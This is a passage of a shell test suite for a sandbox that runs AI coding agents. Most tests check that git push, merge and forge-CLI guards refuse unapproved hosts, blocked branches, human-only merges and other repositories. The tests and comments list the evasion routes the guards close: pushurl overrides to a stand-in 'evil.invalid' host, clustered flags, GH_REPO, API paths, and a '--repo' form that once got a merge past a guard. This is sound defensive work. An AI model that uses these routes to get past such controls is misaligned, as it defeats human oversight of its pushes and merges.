        || { echo "a stale base is warned about rather than refused"; return 1; }
}

@test "the release pass names every area whose check is manual" {
    # This list is the only record of what the test suites cannot see, and it
    # is the kind of list that rots by omission: an area gets a manual check
    # because someone was burned, and then a refactor renames the path and the
    # check silently stops being printed. Pinned against the paths themselves.
    local script="$REPO_ROOT/test/release-pass.sh"
    [ -x "$script" ]
    local area
    for area in bin/dejima docker/entrypoint forges/ docker/forge-guard \
                hooks/merge-guard bin/dejima-tty-suspend web/ harnesses/ \
                bin/dejima-ttyd '\.dejima/allowed-domains'; do
        grep -q -- "$area" "$script" \
            || { echo "release-pass.sh no longer mentions $area"; return 1; }
    done
    # And it must say what it could not run, rather than reporting a pass.
    grep -q 'did NOT run' "$script" \
        || { echo "a gate that could not run is reported as passing"; return 1; }
    # Both halves of the rule, because reporting only one of them is how this
    # goes wrong in each direction: a queued job read as a pass, or a green one
    # hedged as though it might be queued.
    #
    # Matched against the script flattened to one line, so rewrapping a message
    # does not fail a test about what it says.
    local flat_script
    flat_script="$(tr '\n' ' ' < "$script" | tr -s ' ')"
    [[ "$flat_script" == *"queued one is yellow or grey"* ]] \
        || { echo "nothing says a queued CI job is not a passing one"; return 1; }
    [[ "$flat_script" == *"GREEN means"* ]] \
        || { echo "nothing says what green means, so a green run gets hedged"; return 1; }
}

@test "docs/release.md exists and is pointed at from where a release starts" {
    [ -f "$REPO_ROOT/docs/release.md" ]
    grep -q 'docs/release.md' "$REPO_ROOT/.dejima.md" \
        || { echo ".dejima.md does not point at the release pass"; return 1; }
    # The two halves that make this project's review different from a generic
    # one, and the two most likely to be dropped as boilerplate.
    grep -q 'allowed-domains' "$REPO_ROOT/docs/release.md" \
        || { echo "the release review does not mention the CI allowlist"; return 1; }
    grep -q 'queue' "$REPO_ROOT/docs/release.md" \
        || { echo "the release doc does not warn about the queued privileged job"; return 1; }
}

@test "the web page keeps gruvbox exactly, because it owns its own background" {
    # The page sets its own background in CSS, so both sides of the contrast
    # are dejima's and the exact brand values are safe there. The terminal is
    # the opposite case and deliberately uses indexed colour instead - the two
    # are not expected to match any more, and a test comparing them would be
    # asking the terminal to break on backgrounds dejima does not control.
    local css="$REPO_ROOT/web/src/page.css"
    local -A gruvbox=(
        [--gb-fg]=ebdbb2  [--gb-green]=b8bb26  [--gb-yellow]=fabd2f
        [--gb-red]=fb4934 [--gb-blue]=83a598
    )
    local name hex found=0
    for name in "${!gruvbox[@]}"; do
        hex="$(sed -n "s/^  $name: *#\([0-9a-fA-F]\{6\}\).*/\1/p" "$css" | head -1)"
        [ -n "$hex" ] || continue
        found=$((found + 1))
        [ "${hex,,}" = "${gruvbox[$name]}" ] \
            || { echo "$name is #$hex, upstream gruvbox is #${gruvbox[$name]}"; return 1; }
    done
    [ "$found" -ge 3 ] \
        || { echo "only $found of the page's palette entries were checked"; return 1; }
}

@test "turning the toolbar's colours off restores every one of them" {
    # A half-applied override is worse than none: it leaves an operator who
    # asked for the old grey with a toolbar that is neither. Every --key-*
    # the palette defines has to be answered by the mono block.
    local css="$REPO_ROOT/web/src/page.css" name missing=""
    while IFS= read -r name; do
        sed -n '/^body.mono-keys {/,/^}/p' "$css" | grep -q -- "$name:" \
            || missing="$missing $name"
    done < <(sed -n '/^:root {/,/^}/p' "$css" | sed -n 's/^ *\(--key-[a-z0-9-]*\):.*/\1/p')
    [ -z "$missing" ] || { echo "mono-keys does not restore:$missing"; return 1; }
}

@test "the toolbar hierarchy names the buttons it is a hierarchy of" {
    # The order is a decision about what an operator hunts for, and it is only
    # legible if each tier names its keys. A rename in template.html that is
    # not made here turns a tiered button silently grey.
    local css="$REPO_ROOT/web/src/page.css" action
    for action in kbd enter prev-window next-window left down up right; do
        grep -q "data-action=\"$action\"" "$css" \
            || { echo "$action has no tier in the stylesheet"; return 1; }
        grep -q "data-action=\"$action\"" "$REPO_ROOT/web/src/template.html" \
            || { echo "$action is styled but is not a button"; return 1; }
    done
    # And the state a button is in has to beat the job it does, which is
    # source order at equal specificity.
    local tier latch
    tier="$(grep -n 'data-action="kbd"' "$css" | head -1 | cut -d: -f1)"
    latch="$(grep -n 'button.is-armed' "$css" | head -1 | cut -d: -f1)"
    [ "$tier" -lt "$latch" ] \
        || { echo "a tier rule is below the latch rules, so a latched key looks unlatched"; return 1; }
}

@test "a global package is importable in either module system" {
    # Both of Node's resolvers find a bare specifier by walking node_modules
    # directories upwards from the importing file, and every path bottoms out
    # at /, so the symlink there is visible from a directory with no dependency
    # tree of its own. What an agent sees without it is ERR_MODULE_NOT_FOUND,
    # which reads as "this image has no browser" rather than "wrong path".
    #
    # NODE_PATH is deliberately not set: it only ever fed the CommonJS
    # resolver, so it covered require() and left `import` of the same package
    # failing - half a fix, and the half it did cover this symlink covers too.
    local dockerfile="$SANDBOX_DIR/Dockerfile" prefix
    prefix=$(sed -n 's/^ENV NPM_CONFIG_PREFIX=//p' "$dockerfile")
    [ -n "$prefix" ] || { echo "no npm prefix is set, so nothing installs globally"; return 1; }
    grep -qF "ln -s $prefix/lib/node_modules /node_modules" "$dockerfile" \
        || { echo "no root node_modules pointing at $prefix, so an import resolves nowhere"; return 1; }
    grep -qE '^\s*ENV\s+NODE_PATH=' "$dockerfile" \
        && { echo "NODE_PATH is back; it covers require() only and the symlink already does that"; return 1; }
    # The prefix is a contract: a harness manifest names an absolute path to
    # the CLI it launches, and a prefix that moved without them is a harness
    # that cannot be started.
    local conf
    for conf in "$REPO_ROOT"/harnesses/*/harness.conf; do
        grep -qE "^command_path\s*=\s*$prefix/bin/" "$conf" \
            || { echo "$conf names a command_path outside the npm prefix $prefix"; return 1; }
    done
}

@test "the briefing says a browser is here, because agents keep concluding otherwise" {
    # The point of saying it is that it changes what gets done: a user
    # interface that was changed and then described rather than looked at is
    # the failure this is aimed at.
    local out
    out="$(lib briefing_compose none local-only claude-code)" || { echo "$out"; return 1; }
    [[ "$out" == *"playwright"* ]] \
        || { echo "the briefing does not mention the browser"; return 1; }
    [[ "$out" == *"~/shared"* ]] \
        || { echo "it does not say where to leave what it sees"; return 1; }
}

# --- Ctrl-Z (#179) ----------------------------------------------------------
#
# Driven through a real pty with a real interactive shell on it, because the
# question is not what a signal does - it is whether the terminal turns the
# keystroke into a signal at all. Under `docker compose run` it does not: raw
# mode has ISIG off, so Ctrl-Z is the byte 0x1a and it goes to the container.
#
# The stand-in for the container run is in test/fixtures. Docker is not
# available here and is not what is under test; the terminal handling is.

@test "Ctrl-Z suspends the whole launch instead of vanishing into the container" {
    command -v python3 >/dev/null 2>&1 || skip "needs python3"
    local work; work="$(mktemp -d "$BATS_TEST_TMPDIR/ttysuspend.XXXXXX")"
    run env TTY_SUSPEND_WORK="$work" python3 \
        "$REPO_ROOT/test/fixtures/tty-suspend-harness.py" \
        "$REPO_ROOT/bin/dejima-tty-suspend" bash
    [ "$status" -ne 77 ] || skip "no pty available here"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # Named rather than counted, so a harness that silently stopped checking
    # something cannot pass this by reporting fewer results.
    local name
    for name in cycle1-suspend-char-reclaimed \
                cycle1-suspends-the-job cycle1-nothing-reached-the-container \
                cycle1-raw-mode-restored cycle1-redraw-poked \
                cycle2-suspends-the-job cycle2-raw-mode-restored \
                input-reaches-the-resumed-session ctrl-c-still-reaches-the-session; do
        [[ "$output" == *"PASS $name"* ]] \
            || { echo "$name was not checked:"; echo "$output"; return 1; }
    done
}

@test "the Ctrl-Z harness waits for the helper rather than racing it" {
    # #262: the harness typed ^Z as soon as the stand-in printed
    # CONTAINER-ATTACHED, which the stand-in prints immediately after setting
    # raw mode - so that marks the START of the window the helper exists to
    # close, not the end. dejima-tty-suspend only acts once it has polled the
    # terminal and seen -isig, and in between ^Z is still the byte 0x1a. The
    # loser of that race was `nothing-reached-the-container`: the security
    # assertion, failing on a busy machine with nothing wrong.
    #
    # Reproduced by delaying the helper rather than by loading the machine,
    # which makes this a deterministic regression test instead of a coin flip.
    # 0.6s is comfortably past the helper's own 0.05s poll interval and is
    # spent waiting, not spinning. Against the pre-fix harness this fails with
    # exactly the reported signature, byte included.
    command -v python3 >/dev/null 2>&1 || skip "needs python3"
    local work; work="$(mktemp -d "$BATS_TEST_TMPDIR/ttyslow.XXXXXX")"
    local slow="$work/slow-helper.sh"
    cat > "$slow" <<EOF
#!/bin/bash
sleep 0.6
exec "$REPO_ROOT/bin/dejima-tty-suspend"
EOF
    chmod +x "$slow"
    run env TTY_SUSPEND_WORK="$work" python3 \
        "$REPO_ROOT/test/fixtures/tty-suspend-harness.py" "$slow" bash
    [ "$status" -ne 77 ] || skip "no pty available here"
    # By name, and NOT by exit status. A clean run of the whole harness is
    # more than this test is about: `redraw-poked` waits on a half-second
    # resize hold and `suspends-the-job` on the shell's job-control notice,
    # and either can lose a race on a busy machine without saying anything
    # about whether the keystroke was typed too early. Requiring status 0
    # made this fail for the reasons #262 was filed about, in the one test
    # whose entire subject is not racing the helper - observed once during a
    # static run with another suite alongside it.
    #
    # These two are the property. The first is the precondition the fix
    # added; the second is the security assertion that used to lose the race.
    # Against the pre-fix harness the first does not exist and the second
    # fails, so nothing is given up by not reading the exit status.
    local name
    for name in cycle1-suspend-char-reclaimed cycle1-nothing-reached-the-container; do
        [[ "$output" == *"PASS $name"* ]] \
            || { echo "$name did not pass with a late helper:"; echo "$output"; return 1; }
    done
}

@test "the Ctrl-Z harness sees the bug when the fix is not there" {
    # The control. A test that cannot fail is not evidence, and this one is
    # made entirely of timing and terminal state - the two things most likely
    # to quietly stop testing anything.
    command -v python3 >/dev/null 2>&1 || skip "needs python3"
    local work; work="$(mktemp -d "$BATS_TEST_TMPDIR/ttycontrol.XXXXXX")"
    run env TTY_SUSPEND_WORK="$work" TTY_SUSPEND_NO_HELPER=1 python3 \
        "$REPO_ROOT/test/fixtures/tty-suspend-harness.py" \
        "$REPO_ROOT/bin/dejima-tty-suspend" bash
    [ "$status" -ne 77 ] || skip "no pty available here"
    [ "$status" -ne 0 ] || { echo "the control passed, so it proves nothing:"; echo "$output"; return 1; }
    [[ "$output" == *"FAIL cycle1-suspends-the-job"* ]] \
        || { echo "$output"; return 1; }
    # The byte itself, which is the whole bug: it reached the container.
    [[ "$output" == *"FAIL cycle1-nothing-reached-the-container b'\\x1a'"* ]] \
        || { echo "the container did not receive the keystroke:"; echo "$output"; return 1; }
}

@test "the resume resize is held long enough for anything to see it" {
    # Two ioctls back to back are not a resize a program can observe: the
    # signal arrives, the handler reads the size as it is NOW, and by then it
    # is back where it started. Measured on a pty, bytes written after the
    # poke - no hold: 0 from both harnesses; 0.2s: 17810 from Cline, 3328
    # from Claude Code.
    #
    # This is asserted on the source rather than behaviourally, and the reason
    # is worth writing down: the fixture's stand-in is a trivial program that
    # handles the signal faster than either real harness, so it observes an
    # intermediate size that they miss. It passed while both real programs
    # failed. A test that cannot see the failure cannot guard the fix.
    local f="$REPO_ROOT/bin/dejima-tty-suspend"
    local block
    block="$(sed -n '/stty rows "\$((rows - 1))"/,/stty rows "\$rows"/p' "$f")"
    [ -n "$block" ] || { echo "the resize is gone"; return 1; }
    grep -qE '^\s*sleep [0-9.]+' <<< "$block" \
        || { echo "the resize is back-to-back, which no harness can see"; return 1; }
    # And enough of one. The floor measured on a direct pty is between 0.1 and
    # 0.2 seconds, before the hop through the client and the daemon.
    local held
    held="$(grep -oE '^\s*sleep [0-9.]+' <<< "$block" | grep -oE '[0-9.]+')"
    awk -v h="$held" 'BEGIN { exit !(h >= 0.3) }' \
        || { echo "held $held s, below the measured floor plus headroom"; return 1; }
}

@test "the launcher never lets the container client see SIGTSTP" {
    # The whole of #179, in the end. The client survives SIGSTOP and does not
    # survive SIGTSTP: a catchable stop signal interrupts the read it is
    # blocked in, its input forwarding never recovers, and the session comes
    # back alive but deaf. Measured against a real container run, holding
    # everything else equal.
    #
    # So the client is started with the signal ignored - inherited, and kept
    # across exec - and the keystroke is converted into an explicit SIGSTOP
    # for it. Losing any one of these three lines puts the wedge back.
    local d="$REPO_ROOT/bin/dejima"
    grep -q "trap '' TSTP" "$d" \
        || { echo "the client no longer inherits SIGTSTP ignored"; return 1; }
    grep -q '_stop_tree "$SANDBOX_CLIENT_PID"' "$d" \
        || { echo "the keystroke is no longer converted into a SIGSTOP"; return 1; }
    # The whole subtree, not one pid: `docker compose run` is the CLI plus the
    # plugin it runs, and the child is the one holding the terminal.
    grep -q 'for kid in $(pgrep -P "$p" 2>/dev/null); do _stop_tree "$kid"; done' "$d" \
        || { echo "only the top pid is stopped, so a child keeps the terminal"; return 1; }
    grep -q "sandbox \"\$@\" < /dev/tty &" "$d" \
        || { echo "the client is backgrounded without a terminal, so it reads EOF"; return 1; }
    # And the launcher itself must still stop, or the job never fully stops
    # and the prompt never comes back.
    grep -q 'kill -TSTP \$\$' "$d" \
        || { echo "the launcher no longer stops itself, so ^Z suspends nothing"; return 1; }
    # A suspend is not an exit, so the harness never puts the cursor back and
    # the prompt inherits an invisible one - which reads as a dead connection.
    [ "$(grep -c '033\[?25h' "$d")" -ge 2 ] \
        || { echo "the cursor is not restored on suspend and on exit"; return 1; }
}

@test "a launch with no terminal skips the suspend handling entirely" {
    # CI, or output redirected: there is nothing to suspend and /dev/tty would
    # not open. The plain foreground run has to stay reachable.
    grep -q 'SANDBOX_TTY_MODES="$(stty -g < /dev/tty 2>/dev/null)"' "$REPO_ROOT/bin/dejima" \
        || { echo "the terminal is no longer probed before any of this"; return 1; }
    grep -c 'docker compose -f "$COMPOSE_FILE" run --rm' "$REPO_ROOT/bin/dejima" | grep -q '^2$' \
        || { echo "there is no longer one run for a terminal and one without"; return 1; }
}

# --- guards that do not need the harness ------------------------------------
#
# push-guard and merge-guard used to exist only as hook scripts, which meant
# they existed only for a harness that can intercept a tool call. As PATH
# shadows they work for any harness, and they read argv instead of
# regex-matching a reconstructed command string.
#
# They overlap the hooks deliberately rather than replacing them, because the
# coverage differs in both directions: a hook sees `/usr/bin/git push`, which
# walks past the shadow; a shadow sees a push from an editor integration or a
# script, which the harness never reports as a Bash tool call. Neither is a
# boundary - the firewall bounds where a push can reach and the forge decides
# whether to accept it.

_git_guard() {
    # $1 is the repo, rest is argv. Prints the first line of whatever comes out.
    local repo="$1"; shift
    DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
        DEJIMA_FORGE_NAME=gitea bash "$SANDBOX_DIR/git-guard.sh" -C "$repo" "$@" 2>&1 | head -1
}

_guard_repo() {
    local d
    d="$(mktemp -d "$BATS_TEST_TMPDIR/guardrepo.XXXXXX")"
    git -C "$d" init -q -b feature
    git -C "$d" remote add origin git@forge.invalid:o/r.git
    git -C "$d" remote add elsewhere git@evil.invalid:o/r.git
    git -C "$d" -c user.name=t -c user.email=t@invalid commit -q --allow-empty -m seed
    printf '%s' "$d"
}

@test "the git guard refuses a push to a host the forge does not own" {
    local repo; repo="$(_guard_repo)"
    run _git_guard "$repo" push elsewhere
    [[ "$output" == *"may only push to"* ]] || { echo "$output"; return 1; }
}

@test "the git guard refuses a direct push to a blocked branch, however it is spelled" {
    local repo form; repo="$(_guard_repo)"
    # Each of these is the same push wearing different clothes. The hook this
    # supplements matched a regex over a command string and had to anticipate
    # the spelling; argv does not care.
    for form in "push origin main" "push origin HEAD:main" "push --repo=origin main" \
                "push --repo origin main" "push -o ci.skip origin main"; do
        # shellcheck disable=SC2086
        run _git_guard "$repo" $form
        [[ "$output" == *"aren't allowed in the sandbox"* ]] \
            || { echo "not blocked: git $form -> $output"; return 1; }
    done
}

@test "the git guard leaves everything that is not a blocked push alone" {
    local repo; repo="$(_guard_repo)"
    run _git_guard "$repo" status --short
    [[ "$output" != *"Blocked by dejima"* ]] || { echo "$output"; return 1; }
    # A push to an allowed host and an unblocked branch reaches real git, which
    # then fails on its own terms (there is no such host to connect to).
    run _git_guard "$repo" push origin feature
    [[ "$output" != *"Blocked by dejima"* ]] || { echo "$output"; return 1; }
}

@test "the git guard refuses a push whose remote it cannot resolve" {
    # The shape a disagreement between this parser and git's takes. Passing it
    # through would be a push nothing checked, so it fails closed.
    local repo; repo="$(_guard_repo)"
    run _git_guard "$repo" push nosuchremote
    [[ "$output" == *"cannot resolve the remote"* ]] || { echo "$output"; return 1; }
}

@test "a push URL the fetch URL does not name is still checked" {
    # git pushes to remote.<name>.pushurl when one is set and to
    # remote.<name>.url otherwise, so a guard that reads the fetch URL checks a
    # host the push is not going to. `remote get-url --push` is the one
    # question that answers where the push goes.
    #
    # No evasion is needed to reach it. .git/config is in the read-write
    # project mount - deliberately, since `git push -u` writes to it - so a
    # session can set a pushurl and every later push is checked against the
    # wrong host.
    local repo; repo="$(_guard_repo)"
    git -C "$repo" config remote.origin.pushurl git@evil.invalid:o/r.git

    run _git_guard "$repo" push origin feature
    [[ "$output" == *"may only push to"* ]] \
        || { echo "the shadow checked the fetch URL: $output"; return 1; }
    [[ "$output" == *"evil.invalid"* ]] \
        || { echo "it named the wrong host: $output"; return 1; }

    # And the hook, which resolves the same thing its own way.
    run bash -c 'printf "{\"tool_input\":{\"command\":\"git push origin feature\"},\"cwd\":\"$1\"}" \
        | DEJIMA=1 DEJIMA_PUSH_HOSTS=forge.invalid DEJIMA_BLOCKED_BRANCHES=main \
          DEJIMA_FORGE_NAME=gitea bash "$2/hooks/git-push-guard.sh" 2>&1' _ "$repo" "$REPO_ROOT"
    [[ "$output" == *"Blocked by"* ]] \
        || { echo "the hook checked the fetch URL: $output"; return 1; }
}

@test "a one-command pushurl is checked too, not only one in the config" {
    # `git -c remote.origin.pushurl=... push origin branch` sets it for a
    # single command. Both guards skip `-c` and its value when finding the
    # subcommand, so what they resolve has to be right without it.
    local repo; repo="$(_guard_repo)"
    run _git_guard "$repo" -c remote.origin.pushurl=git@evil.invalid:o/r.git push origin feature
    [[ "$output" == *"may only push to"* ]] \
        || { echo "$output"; return 1; }
}

@test "the hook sees a push however git's own options are spelled" {
    # It recognised `git push` and `git -C <dir> push` and nothing else, so
    # every other spelling of git's own options was not a push as far as it was
    # concerned and it allowed the command without checking anything. The PATH
    # shadow walks argv and caught them regardless - this is the earlier
    # warning agreeing with it, not the boundary.
    local repo hook_out; repo="$(_guard_repo)"
    local cmd
    for cmd in "git --no-pager push origin main" \
               "git -c core.pager=cat push origin main" \
               "git --git-dir=$repo/.git push origin main" \
               "ls && git push origin main"; do
        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
        [[ "$hook_out" == *"Blocked by"* ]] \
            || { echo "not seen as a push: $cmd"; return 1; }
    done
    # And a token that merely says push is not a git invocation.
    hook_out="$(printf '{"tool_input":{"command":"echo push origin main"},"cwd":"%s"}' "$repo" \
        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
    [ -z "$hook_out" ] || { echo "blocked something that is not a push: $hook_out"; return 1; }
}

@test "both push guards refuse a remote they cannot resolve" {
    # The fail direction, and the two used to differ: the shadow refused and
    # said why, the hook exited 0. An unresolvable remote is what a
    # disagreement between either parser and git's own looks like, and that
    # has to be a refusal rather than a push nobody checked.
    local repo hook_out; repo="$(_guard_repo)"
    run _git_guard "$repo" push nosuchremote feature
    [[ "$output" == *"cannot resolve the remote"* ]] || { echo "shadow: $output"; return 1; }

    hook_out="$(printf '{"tool_input":{"command":"git push nosuchremote feature"},"cwd":"%s"}' "$repo" \
        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
    [[ "$hook_out" == *"cannot resolve the remote"* ]] || { echo "hook: $hook_out"; return 1; }
}

@test "the two push guards agree on the same pushes" {
    # Two implementations of one rule is the drift this repo warns about, so
    # the overlap is pinned rather than assumed: for each case, the hook and
    # the shadow reach the same verdict.
    local repo cmd hook_out guard_out hook_blocked guard_blocked
    repo="$(_guard_repo)"
    for cmd in "git push origin main" "git push elsewhere" "git push origin feature"; do
        # `|| true` because the hook signals a block by exiting 2, which would
        # otherwise abort the test body before the comparison.
        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
        # shellcheck disable=SC2086
        guard_out="$(_git_guard "$repo" ${cmd#git } || true)"
        hook_blocked=0; guard_blocked=0
        [[ "$hook_out" == *"Blocked by"* ]] && hook_blocked=1
        [[ "$guard_out" == *"Blocked by dejima"* ]] && guard_blocked=1
        [ "$hook_blocked" -eq "$guard_blocked" ] || {
            echo "disagreement on '$cmd': hook=$hook_blocked shadow=$guard_blocked" >&2
            echo "  hook:   $hook_out" >&2
            echo "  shadow: $guard_out" >&2
            return 1
        }
    done
}

# A refusal is three things, and the tests asserted one: the message. A guard
# that printed it and then ran the command anyway passed them, which is the
# shape of failure a guard test exists to catch. $1 is the phrase the refusal
# is known by; the stub CLIs all print "real: $*", so its absence is what
# proves nothing reached them (#245).
assert_forge_refused() {
    local phrase="$1" what="${2:-the command}"
    [[ "$output" == *"$phrase"* ]] \
        || { echo "$what was not refused: $output"; return 1; }
    [[ "$output" != *real:* ]] \
        || { echo "$what was refused AND ran: $output"; return 1; }
    [ "$status" -ne 0 ] \
        || { echo "$what was refused but exited 0"; return 1; }
}

@test "the forge guard refuses only the subcommand a workflow blocks" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/forgeguard.XXXXXX")"
    mkdir -p "$d/real"
    printf '#!/bin/bash\necho "real: $*"\n' > "$d/real/gitea-pr"
    chmod +x "$d/real/gitea-pr"
    cp "$SANDBOX_DIR/forge-guard.sh" "$d/gitea-pr"
    chmod +x "$d/gitea-pr"
    local blocked="merge"

    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gitea-pr $blocked" DEJIMA_FORGE_REAL_DIR="$d/real" \
        "$d/gitea-pr" "$blocked" 7
    assert_forge_refused "human decision in the sandbox" "the blocked subcommand" || return 1

    # Flags before the subcommand do not smuggle it past.
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gitea-pr $blocked" DEJIMA_FORGE_REAL_DIR="$d/real" \
        "$d/gitea-pr" --verbose "$blocked" 7
    assert_forge_refused "human decision in the sandbox" "a flag before the subcommand" || return 1

    # Nor does a flag that takes a SEPARATE value, which is the form that got
    # past this and is the ordinary way to name a PR from outside its checkout:
    # `gh --repo owner/name pr merge N`. The value is indistinguishable from a
    # subcommand here, so a match anchored at the first non-flag argument found
    # `owner/name`, gave up, and handed the merge to the real CLI.
    printf '#!/bin/bash\necho "real: $*"\n' > "$d/real/gh"
    chmod +x "$d/real/gh"
    cp "$SANDBOX_DIR/forge-guard.sh" "$d/gh"
    chmod +x "$d/gh"
    local form
    for form in "--repo o/r pr merge 7" "--repo=o/r pr merge 7" "pr merge 7"; do
        # shellcheck disable=SC2086
        run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gh pr merge" DEJIMA_FORGE_REAL_DIR="$d/real" \
            "$d/gh" $form
        assert_forge_refused "human decision in the sandbox" "gh $form" || return 1
    done

    # And a command that merely mentions the blocked words out of order still
    # reaches the real CLI - the run has to be consecutive.
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gh pr merge" DEJIMA_FORGE_REAL_DIR="$d/real" \
        "$d/gh" pr edit 7 --add-label merge
    [[ "$output" == real:* ]] || { echo "a label named merge was blocked: $output"; return 1; }

    # Everything else reaches the real CLI, including a subcommand that merely
    # starts with the blocked word.
    local sub
    for sub in create comments mergeable; do
        run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gitea-pr $blocked" DEJIMA_FORGE_REAL_DIR="$d/real" \
            "$d/gitea-pr" "$sub" 7
        [[ "$output" == real:* ]] || { echo "$sub was blocked: $output"; return 1; }
    done

    # A block naming a different CLI is not this one's business.
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gh pr $blocked" DEJIMA_FORGE_REAL_DIR="$d/real" \
        "$d/gitea-pr" "$blocked" 7
    [[ "$output" == real:* ]] || { echo "$output"; return 1; }
}

# --- the repository the session was launched against ------------------------
#
# #187. The gitea CLIs resolve the repo from origin and refuse another host,
# so they cannot be aimed elsewhere. `gh` takes --repo on nearly every
# subcommand and reads GH_REPO, which makes filing an issue on an unrelated
# repository the same length of command as filing one here. A forge declares
# the spellings; the guard compares them.

_repo_guard_shim() {
    local d="$1"; shift
    mkdir -p "$d/real"
    printf '#!/bin/bash\necho "real: $*"\n' > "$d/real/gh"
    chmod +x "$d/real/gh"
    cp "$SANDBOX_DIR/forge-guard.sh" "$d/gh"
    chmod +x "$d/gh"
}

@test "the forge guard refuses a command aimed at another repository" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/repoguard.XXXXXX")"
    _repo_guard_shim "$d"
    local env_common=(DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real"
                      DEJIMA_FORGE_REPO=own/thing
                      DEJIMA_FORGE_REPO_FLAGS="--repo -R" DEJIMA_FORGE_REPO_ENV=GH_REPO)

    # Every spelling gh accepts. The short flag carries its value attached,
    # which two-dash flags do not do - and short flags cluster, so the letter
    # can arrive with other flags in front of it (#243). `-wR other/thing` is
    # what an agent writes when it wanted `--web` too, and it is not `-R` as
    # its own argument.
    local form
    for form in "--repo other/thing" "--repo=other/thing" "-R other/thing" "-Rother/thing" \
                "-wR other/thing" "-wRother/thing"; do
        # shellcheck disable=SC2086
        run env "${env_common[@]}" "$d/gh" $form issue create --title x
        assert_forge_refused "Blocked by dejima" "gh $form" || return 1
    done

    # And the environment variable, which takes no argument at all and would
    # otherwise be the way around every check above.
    run env "${env_common[@]}" GH_REPO=other/thing "$d/gh" issue create --title x
    assert_forge_refused "Blocked by dejima" "GH_REPO" || return 1

    # The repository the session IS for goes through, in any capitalisation:
    # forges preserve case without distinguishing it, and a refusal over that
    # would be a false one.
    for form in "--repo own/thing" "--repo Own/Thing" "-wR own/thing" "-L 5" ""; do
        # shellcheck disable=SC2086
        run env "${env_common[@]}" "$d/gh" $form issue list
        [[ "$output" == real:* ]] || { echo "'$form' was blocked: $output"; return 1; }
    done

    # A launch that resolved no repository refuses rather than waving it
    # through: a workspace with no origin has nothing --repo can legitimately
    # name, and "cannot confirm" is not a reason to allow.
    run env DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real" DEJIMA_FORGE_REPO="" \
        DEJIMA_FORGE_REPO_FLAGS="--repo -R" "$d/gh" --repo any/thing issue create
    [[ "$output" == *"Blocked by dejima"* ]] || { echo "$output"; return 1; }

    # The merge block still answers first for a merge, whatever repo it names:
    # the more specific refusal is the more useful one to read.
    run env "${env_common[@]}" DEJIMA_MERGE_BLOCK="gh pr merge" \
        "$d/gh" --repo other/thing pr merge 3
    [[ "$output" == *"human decision in the sandbox"* ]] || { echo "$output"; return 1; }
}

@test "the forge guard sees a repository named in a gh api path" {
    # `gh api repos/<owner>/<name>/issues` reaches any repository the token
    # does with no --repo anywhere in it, so every flag spelling above is
    # beside the point (#243). Declared by the manifest as `api:repos`, so
    # core stays forge-neutral.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/repopath.XXXXXX")"
    _repo_guard_shim "$d"
    local env_common=(DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real"
                      DEJIMA_FORGE_REPO=own/thing
                      DEJIMA_FORGE_REPO_PATHS="api:repos")
    local form
    for form in "repos/other/thing/issues" "/repos/other/thing/issues" \
                "repos/other/thing"; do
        run env "${env_common[@]}" "$d/gh" api "$form"
        assert_forge_refused "Blocked by dejima" "gh api $form" || return 1
    done

    # The launched-against repository goes through, and so do the two shapes
    # a false refusal would land on. Both matter more than the catches do: a
    # fast-fail that blocks an honest command costs an agent a working tool,
    # and it will reach for a way around rather than stop.
    #
    #   - gh substitutes {owner}/{repo} from the checkout, so a path carrying
    #     them names THIS repository by construction.
    #   - the check is scoped to the declared subcommand, so a title or body
    #     that happens to look like an API path is not argv to compare.
    for form in "api repos/own/thing/issues" "api repos/{owner}/{repo}/issues" \
                "issue create --title repos/other/thing" \
                "api user/repos" "api graphql"; do
        # shellcheck disable=SC2086
        run env "${env_common[@]}" "$d/gh" $form
        [[ "$output" == real:* ]] || { echo "'$form' was blocked: $output"; return 1; }
    done
}

@test "a forge that declares no repo flags is left alone by that check" {
    # The gitea CLIs' own refusal is stricter than this guard's and lives in
    # the tool. A forge declaring nothing here must not acquire a check it did
    # not ask for - and must still be a pass-through with nothing else set.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/repoguard-off.XXXXXX")"
    _repo_guard_shim "$d"
    run env DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real" DEJIMA_FORGE_REPO=own/thing \
        "$d/gh" --repo other/thing issue create
    [[ "$output" == real:* ]] || { echo "$output"; return 1; }
}

@test "the github forge declares how its CLI can be aimed elsewhere" {
    # The guard is generic; what makes it fire is the manifest. A forge whose
    # CLI takes a --repo and declares nothing here is one the check silently
    # does not cover, which is the failure this pins.
    local conf="$REPO_ROOT/forges/github/forge.conf"
    grep -qE '^repo_flags[[:space:]]*=.*--repo' "$conf" \
